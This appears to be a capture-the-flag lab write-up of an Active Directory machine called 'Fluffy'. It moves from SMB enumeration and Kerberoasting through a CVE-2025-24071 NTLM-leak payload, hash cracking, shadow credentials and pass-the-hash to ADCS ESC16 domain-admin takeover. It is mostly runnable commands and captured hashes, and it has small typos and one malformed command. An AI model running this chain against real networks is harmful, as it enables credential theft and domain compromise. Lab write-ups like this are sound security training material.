---
hidden: true
---

# Fluffy

## Machine Info

Starting credentials:`j.fleischman:J0elTHEM4n1990!`



## Port Scanning

```bash
nmap -T5 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.69

Nmap scan report for 10.10.11.69
Host is up (0.034s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 21:47:05Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```



## SMB Enumeration

### SMB Shares

{% code overflow="wrap" %}
```bash
crackmapexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

```bash
smbclient -N //10.10.11.69/IT -U 'j.fleischman%J0elTHEM4n1990!'
```

There is a pdf document that describe a Upgrade process

```bash
> get Upgrade_Notice.pdf
```

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>



## BloodHound

{% code overflow="wrap" %}
```
bloodhound-python -c all -ns 10.10.11.69 -dc fluffy.htb -d fluffy.htb --zip -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```
{% endcode %}



### Kerberostable accounts

Try running the query to detect all kerberostable users in the domain.

<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

As we can notice, the users `CA_SVC` and `LDAP_SVC` are in the `SERVICE ACCOUNTS` group and they have "GenericWrite" privilege to `WINRM_SVC` user.

<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

### Kerberost attack with Metasploit

```bash
sudo service postgresql start && msfconsole

use auxiliary/gather/get_user_spns
set domain fluffy.htb
set user 'j.fleischman'
set pass 'J0elTHEM4n1990!'
set RHOST 10.10.11.69
run
```

Output with hash:

```
[*] Running for 10.10.11.69...
[+] ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
[+] ----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
[+] ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 18:07:50.136701  2025-05-27 00:20:07.519068             
[+] LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 18:17:00.599545  <never>                                
[+] WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-18 02:51:16.786913  2025-05-27 00:18:43.268927             
[+] $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$609bacbd37dae06ab0946d89d797ffbc$9b2a79e560404513f8f9c37fd993dd730b0ad2963eafd8b64f63b9c8b4db0116889a34dc63a6d5667bdef2a3c8c95f2946ab1bb7d179cdeee22ca775c0df58d1da1696700ad14190cb1c43d7fc27a98473f1ecddf4c829952ac8a7c30a0356cfa355c6f2901b4ee3757fe8f333bdfcc3cd5a0e4dcb8cbad2d4b332b260bdba9fc8db332723e8ed51365da1fad60beba143d86b5b79b43dc03b7e1a49d958f2979b0f0c85c4a88c5583ec20289cf1cd6b9b923265f850c297dec3369cbb92fe98cdcc5058385c2839780f0bbb41ed99fce1f4e21164ada212e02257f6e3945eba6d2651010dd8aa18bf01ec9a9cc7342ae3ddd0c35732a879b1bd14263a81ee00241a34847b71cf819287fec306360dd2800f694658256cd21c6c2ae86c3f5cede944168705caa4cdfc53b5a771ed936c6637cb824952030064cf5eb7551486ad5e541b1ce501c71c23b0d7416baf58a6708f694f98824802b8521a24832bf6baea57401dfdb941d2c56103972e24bf5524efd40bb435ac5961084044170dfdd60a8c0a0d17410fedcf9e96097bdd9de4d7e8624f0a0c303fbba7d86badb09acb9d1d7a9a589b1d0d4545db0595020013fe5a7b005b0e0a3d97fff107af28139ea9e25e01ba5a4f4bcb2d6aecc351cccec9fc8a07fdf45488ccc5d73f90e3b7955229b80f7b8749f9221359d628f81312170bc847575591c56a4c47abf3d57c4e2ae4ce124ecc1a04f3a79b13a3b54e9c51f6cc15291a7820b585333f3d31e5e6e90fed6e3388588bfc851e04705f09319b642a0fa07fe3bee85dcd0ac1a95c51b3e851d63ab2a911e254cc2d7977be6e50cf1eb270aa0a6ed739c817b8cd3c200e88deb1c3002dbdca8d013fb7cbde6c2974be8d0e8d3d01126387d22086a284e0e1b05b5425871975913e29a13b8463705c8e92ebbd8b02e3a040e1b31749e0d6ac9b094f525a2205b6cdddbf90a90b847dcde219881d7e648bfb4008dc106428fe98b0ea43f73584695333325d05fdc132d90dbf35558137d90aa40568915fcaed468ec3f17015401a678d76282e1ac6b0904bcd2f0f5041913c27dc64379ba0648755b3d845953e5da8db991fb9dfe96f92a84943aee3bcc461feddab51f75b0666d619b42c6cf7a19f73644e62525cb434eb229443aa1cd7b0e0851f4a0947db807ff98f2c050e2b08e40dd57f2cd10f7efc83df64bdf92071827948fc4a2180ed70f084017bdd035494ac0ef390c5a588c4b10c6ab13eb899aa6615e3953ae6cbd7633fad982a3381399a53f8cbb6ae8abf4c2269f8b21a6ebfa481209e9f483697a9b9a25a5a84491cd72e210ce998d3aa2d1cb27b863c65fdeac51074cc0139e38faee4eb91f57632561ee1e73efe0d3aaa9a86be859fe12d9467c35a9a5c3603af3849c676fee3fd44227a2b2dbbc5188ffcf9ebf03ee8331a3b5517ef5d26f9d8335b994cefd177d631e5a6e735457df05d5a8e4ebd0792d9e0a15a22187f6a93b49f671ef0fe48a5a4f21e1aca95449166514f10e66b6cfa4166e9251f4912614bb7
[+] $krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$c11b4955dab47089499e8f7dd5a6355b$b803fd08f478e5714f4047eeba7d7d55acffb1d66cf641e1268625ddd9df0d36dddbf16142651b1937974a88c3f5223806649ced3797f8ab562c85fefcc2f1097b97e6492184e20d3a397fde92b69466117ebc2ce7c284602ef90546a53e3458fa47943cc30ec64308c46e05068f9955630a58e415036642fd68975b719be34a544c55b32d6d4e060a6c5e946a7cb9b5de9b47976fc44849be4267a8668f3667d4b09d497c2c1f15bc434c9597d9bcef357a51bc4524300e3c75f62272213302b884b5c934f5c9744041ec841303804cdb885b4eb2cad479ab42d81441aa5d71590060e394339eada01778fbeb9a5710d4dee562cf640dbc5b8dba2e3ec181f9b9c350d245a14d1f4cbfc4cf5c4d135c3ccd0be4b2162cb7c8d05b2b51df057d96e9065f3b4bc2029fcebc00533e950d7d75aa578f0dd9bc7e43f78f425a6f1ac7c5d08041bd8367e58c5eb1edade8c8d22d21b079024d395bc014a898e459a173abd47920bab46ec9939e3047c34bfbc2d7d8ff121078100797e0f176a4a6ff464f4047a38bb24c7e49c7ae008cc898be4d60110efbe12e26639c8ad3c055b580c8e017119d5432419cd38ee7edcaee01b6d9e877f6f68f17bffd76fe82b726e9cefc7947fea475f9f1973c805169fef4f0220559e9f99daf35f4d5ab7e26dd5f10e34c01ceef0557b058fc7619a5db670adba557f4902ec39ca93a4fb2b5e060bb5bb3055f481042e15c658be846d305e22ff53c26198487c819f67657907cd1ef5b75c909ade622b0484656b2125b74786ed9bbd0e3b827cb2e0194936ac586a3bad30dcf0d4290183d39f7e306269b9a8db2bbfde1f5af70bdb969883997d1fd493ce7d5d5024f8866037db1e3fd111dee87625e61ac96e259eb04e405ca88192e34cead13df565a49cd593808669eba67aa7da9439a6c42de7e6e8960454911d1f602961af10b6dbba180250df9b6312288fb0a1bddea83b073486c79cb3b213d302f1c9d0f7a564ad00d17eef07bb5b577ecccc2309d60880c592f1195d514e0c72c00e9661c25a2109b7597a0a4869f468c87e61b99d1b6402a14423333b809662ff723a9a5a80ed4d5e6b24fa18f0415740898f7248a516bc775adc3f65184bad310184b0d34fbb92435f4c0597253e9c7bbeaae3f500ebe6ecc4beabc26ca34a87d495b57a32ddff6ea17550f2fe1ff4d95b9893706c68190d807dab522167cd4b5632415aa977a41afba7af50d60764de4e43396ffa11359a77893c21fab6b1724078889ad4f0e5c7f0e4dfa853ce77d66699fea0cbc6fc2cbca0e9b35e90996e2c72f045426c2c7b8e738e8f17700d61ff2d6e15eb847d134f63880fa75a4648321830ecf65aa07f342a2b34bed7c470f0152e66a94e2d28a09bed5db8afaaf5b99625aaed23e48709c8ebd781871342378659fbc35c1fa1b27f16c59370fe878f54dd91c33819a2daf2d0dd791de092346e366c813496b99396772737b4e9fbf5d9360663d022a9f4f3fb0f62fc6385d6d5929d1705b6359bdb424d2dcc3fbb13b
[+] $krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$122b4365816e6b157da88251cba93b24$7b89f52bceaa8ebb53830a7a0334060d88d51da48060ea539480b6cdd1b34e295a3ddf792c1133b333a0d762add4939c106d940f0c46499948e815f8769f36029fd5efdf06a9bc4b5d8496729841dcb6fc16be470fc41f1b84f0e6d78535d8bd875ec56d972c07eede78915c55e8f3c6aec70cdd0a1b6ad5a4a16e2bab4455114a2081a0ddc3e187b0f235c6570127bed8ff33556d45b69427fc2a1a7c62bcf6836fd43fb9fa52d2b265f9d1fde639fc250f3830cca2631035947c259f3ebe5dad8ebbcdbaccc62f0e963fc69917a7e0d4d1506fb62406f6146e3ef9e4aeeaeb1de2124f424d71938da2b1852b4b45892ca836a65aeb3ab01195ed69d75af911ae68dddd297549ab3522f2b3bbda914645a0ded0eef19a958f1921745e0333450de2a349a33f8e5d5cbaf702d29a78f37bfe330b5c8196df81f603349a33eb6da617398fd0172d778d8f7c9f61d183c36536480e7215eb6ec0d0bad9f8c7898db739cdc7ba7a270d261e1bcd5ff69655d440c12484ff0451d374ab6b2f57e3faea7b0e28968ec81c24e3e7a4e4b20e70f982460a6997793b364fad776718488f715307847223d42abbbe813e2705d9b3f80540eb4a1265cf270dd8474311922578836ec7c2bb5632bf4e22f64ffc4514fce4a47dafce4b7443de786be7c5f6f4d76dcdfedb6099f4903622d916e293d89600ea465ce68271aca82e8bb9c14a4726c5366e970160de582d2f80a543937ecd489dfc3f25aa79d9f36b286efccf5431996868936195c0b5f665cbd146b0371b593cf3cf73a6585a098b06eae1afec0f9acf26fffae17b4caead3d5fd5a687de6773cb2a8a80735dcb3d208783b3b9627792dfc176d324aac9f4de25ed077a36b58b72f6d47b7730167a6c29524da19bba3e4c89cdf284b8520f48eec5858c69ee084f73b30adf8b1917d8280182aaffaddad05855155ee9056d013c43b8738f5339ef0d959007c50ebc10fa042cf370a24ce2b82a7dbcec9a54d0f508001fb6ad2d99827c09aa02c179549f6321de6e4b1295caa04379d23da11be5822b70e46c476ef53fdeac4fcc4f2b7cdea13b9d26628a3b46067347abd300037f3a551b09f3ed646afffcb92f22a9956df39e4ae53e5806659d4a2f4bf8e7065d8a675546410e3fa51b0c02221e1d312970555c98902dbdf6a9846472333ceb29afe0ff6a5895d545eb34b17ed8bfeff0eba45a9c35bc8060a41db44e22234832a821ca8220f23f258793202702137594522589cb4c0a4e741526dda5a79336d8a9ecfe576ed9ec9446b4394a3935601edb8f2da668db46471ce2b7f6309f909f20e8deb6a2bf4096e6e1fe79532d1f74d9fb8d0221bc51822cbb15d5ef9798664c861243102f43cf6c8eac2df1f27c9f96110aaf56a61cee74e1755418e5a8ab2f5cdb2e99d8b7c048426c39752b0b5ae2c3018612170152617f2119c25a9442704b8e9d1293f65b40e383aa5d714ea8639112bcd3ceb2e0aaced85034cf4bf9b99fb54e14d9b1f6b1ed1f295a8be599386242b5edf000169c

```

Copy the hashes in a file and try to crack them.

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
```

Nothings to do :(



## CVE-2025-2025-24071 - Windows Explorer Leaks NTLM Hashes

{% embed url="https://rewterz.com/threat-advisory/poc-released-windows-explorer-vulnerability-leaks-ntlm-hashes" %}

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Like we can write above. We have to craft a .library-ms file with inside a SMB path.&#x20;

{% code title=".library-ms file" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```
{% endcode %}

The SMB path will point to our SMB server which once the victim extract the file, Windows will send the NTLM hash of the logged user to SMB server controlled by us.&#x20;

Follow this PoC on GitHub to generate the payload.

{% embed url="https://github.com/0x6rss/CVE-2025-24071_PoC" %}

{% code title="CVE-2025-24071 exploit" %}
```bash
python3 exploit.py -f andy -i 10.10.11.69 -afv
```
{% endcode %}

The command above will generates a .zip file named exploit.zip to send to smb share writable on victim's PC.

First to send, start a SMB server on local machine with `impacket-smbserver`

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Now upload the file and wait for a user to extract the .zip file.

{% code title="smbclient shell" overflow="wrap" %}
```bash
> smb: \> put /PATH/TO/CVE-2025-24071/exploit.zip exploit.zip
```
{% endcode %}

When the user extract the payload in our SMB server we will see this:

<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
[*] Incoming connection (10.10.11.69,56513)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:078fa02d18e0c3b3014e84bfdf2c8fcc:0101000000000000003dc95a51cfdb0175f0bd3186a398af00000000010010007200790075004500790075006d006300030010007200790075004500790075006d0063000200100044006100710050006e007400750071000400100044006100710050006e0074007500710007000800003dc95a51cfdb0106000400020000000800300030000000000000000100000000200000a201a7207c75e3c4363868b48dd83c90e51c555356e1790a59b3a1da25e0982f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100330038000000000000000000
```
{% endcode %}

This is the NTLM hash of the user `p.agila` .

### Crack NTLMv2 hash of p.agila user.

Copy the NTLMv2 inside a file and try to crack it with hashcat.

{% code title="htlmv2.txt" %}
```
p.agila::FLUFFY:aaaaaaaaaaaaaaaa:078fa02d18e0c3b3014e84bfdf2c8fcc:0101000000000000003dc95a51cfdb0175f0bd3186a398af00000000010010007200790075004500790075006d006300030010007200790075004500790075006d0063000200100044006100710050006e007400750071000400100044006100710050006e0074007500710007000800003dc95a51cfdb0106000400020000000800300030000000000000000100000000200000a201a7207c75e3c4363868b48dd83c90e51c555356e1790a59b3a1da25e0982f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100330038000000000000000000
```
{% endcode %}

```bash
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt 
```

We cracked the hash.

```
p.agila:prometheusx-303
```



### Generic All on SERVICE ACCOUNTS group

Now that we obtained a new user, check on bloodhound what we can do with that.

<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

How we can see the user that we have, has "GenericAll" rights on SERVICE ACCOUNTS.

Add the user p.agila to SERVICE ACCOUNTS to get rights to all group's user.

{% code overflow="wrap" %}
```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U FLUFFY.HTB/'p.agila' -S "10.10.11.69"
```
{% endcode %}

Now try to get Shadow Credentials of WINRM\_SVC user.

{% code overflow="wrap" %}
```bash
python3 pywhisker/pywhisker.py -d "FLUFFY.HTB" -u "p.agila" -p 'prometheusx-303' --target "WINRM_SVC" --action "add" --dc-ip "10.10.11.69"
```
{% endcode %}

Convert the obtained certificates to get the TGT into `ccache` file with PKINITtools `gettgtpkinit.py` tool.&#x20;

{% code overflow="wrap" %}
```bash
python gettgtpkinit.py -cert-pfx UwcRKHbu.pfx -pfx-pass IQVqv7pIqW4oUotob0tQ -cert-pem UwcRKHbu_cert.pem -key-pem UwcRKHbu_priv.pem -dc-ip 10.10.11.69 FLUFFY.HTB/WINRM_SVC winrm_svc.ccache

#output 
2025-05-29 00:21:37,791 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-29 00:21:37,820 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-29 00:21:47,491 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-29 00:21:47,492 minikerberos INFO     4342e19f9e593c0dfcedc705c4d5a80cb6edf3c1442ce319bf833ddfccd0d6f3 # <-----
INFO:minikerberos:4342e19f9e593c0dfcedc705c4d5a80cb6edf3c1442ce319bf833ddfccd0d6f3
2025-05-29 00:21:47,494 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file


```
{% endcode %}

Now set the .ccache file inside follow env variable:

```bash
export KRB5CCNAME=/PATH/TO/PKINITtools/winrm_svc.ccache
```

Use `getnthash.py` tool in the same tools packet to get user's hash from TGT ticket

{% code overflow="wrap" %}
```bash
python getnthash.py -key 4342e19f9e593c0dfcedc705c4d5a80cb6edf3c1442ce319bf833ddfccd0d6f3 FLUFFY.HTB/WINRM_SVC

#output 
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
33bd09dcd697600edf6b3a7af4875767
```
{% endcode %}

### Pass-the-Hash with WINRM\_SVC user

As we saw in the bloodhound the user `winrm_svc` has the rights to access into `DC01`.

We can try to perform a **pass-the-hash** in the `evil-winrm` tool to access into it.

```bash
evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
```

### User.flag

We are in! Get the user flag

```powershell
more C:\Users\winrm_svc\Desktop\user.txt
```

## Privilege Escalation for Root

Do the same privious steps to get `CA_SVC` hash, that might has some AD CS misconfiguration.

Once we followed the steps this is the obtained Hash

```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8
```

### Use Certify to detect AD CS

Having the `ca_svc`'s hash we can check using `certify` tool if there are some AD CS misconfig.

{% code overflow="wrap" %}
```bash
certipy find -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -vulnerable -enabled
```
{% endcode %}

Making a grep command to the output and check if there is some ESC misconfig

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

The CA is vulnerable for the ESC16. Follow the guide to exploit this.

{% content-ref url="../../../pt/active-directory-pt/ad-post-compromise-attacks/ad-cs/esc16.md" %}
[esc16.md](../../../pt/active-directory-pt/ad-post-compromise-attacks/ad-cs/esc16.md)
{% endcontent-ref %}

### ESC16 exploitation

This ulnerability allows us to change a user's UPN. In this way, we can change the `ca_svc` upn with `administrator` upn.

Change the ca\_svc's upn.

{% code overflow="wrap" %}
```bash
certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -target DC01.fluffy.htb -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
```
{% endcode %}

Check the changes

{% code overflow="wrap" %}
```bash
certipy account -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -usevc' read
```
{% endcode %}

Request the administrator certificate to get his hash.

{% code overflow="wrap" %}
```bash
certipy req -dc-ip 10.10.11.69 -u 'administrator' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -target DC01.htb -ca 'fluffy-DC01-CA' -template 'User'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Get the hash from the `administrator.pfx` file.

{% code overflow="wrap" %}
```bash
certipy auth -pfx administrator.pfx -domain 'FLUFFY.HTB' -dc-ip 10.10.11.69
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

### Winrm connection as administrator

Now that we have the administrator's hash, will try to connect using **pass-the-hash** with `evil-winrm` tool.

```bash
evil-winrm -i 10.10.11.69 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e' 
```

We got access as administrator!

### Root.flag

```powershell
more C:\Users\Administrator\Desktop\root.txt
```
